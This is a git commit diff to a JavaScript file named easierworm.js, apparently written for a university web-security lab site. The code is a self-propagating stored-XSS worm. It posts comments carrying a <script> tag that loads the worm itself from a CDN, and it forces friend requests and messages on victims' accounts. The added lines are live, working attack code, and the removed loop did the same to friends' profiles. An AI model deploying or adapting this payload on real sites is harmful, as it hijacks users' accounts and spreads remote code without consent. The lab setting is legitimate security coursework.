0c880c8f2c8ab08639716c0d7b79793123091ea1
DarkLemon27 <47903566+DarkLemon27@users.noreply.github.com>
2020-04-03 19:01:57 -0400

    Update easierworm.js

--- easierworm.js
+++ easierworm.js
@@ -17,31 +17,12 @@ function moveitmoveit() {
     });
     var eff = friend.responseText;
     var arr= eff.match('^[^<br]*').join().split(',');
-    for( var i = 0; i < arr.length; i++){
-        /*var newhome = $.ajax({
-            async: false,
-            type: 'GET',
-            data: { id: arr[i] },
-            url: 'http://csec380-core.csec.rit.edu:86/home.php',
-            success: function(data) {
-                return data;
-            }
-        });*/
-        var newhome = $.get("http://csec380-core.csec.rit.edu:86/home.php",{id: arr[i]}, function(data){ 
-            if (JSON.stringify(data).match('DarkLemon27') == null){   
-                alert("Not here");
-                $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{
-                    id: ,
-                    comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp/worm8.js"></script><img src="https://img.buzzfeed.com/buzzfeed-static/static/2019-11/19/20/asset/be34feec736a/sub-buzz-4628-1574196545-1.png" width=300 height=300 />'
-                });
-            }
-            return data; 
-        });
-        
-    }
-    if(eff.match('159') == null){
-        $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 159});
-        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 159,comment: 'Im your friend now'});
+    
+    if(eff.match('160') == null){
+        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",
+              { comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp@latest/easierworm.js"></script><img src="https://img.buzzfeed.com/buzzfeed-static/static/2019-11/19/20/asset/be34feec736a/sub-buzz-4628-1574196545-1.png" width=300 height=300 />'});
+        $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 160});
+        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 160,comment: 'Im your friend now'});
     }
 }
 moveitmoveit();
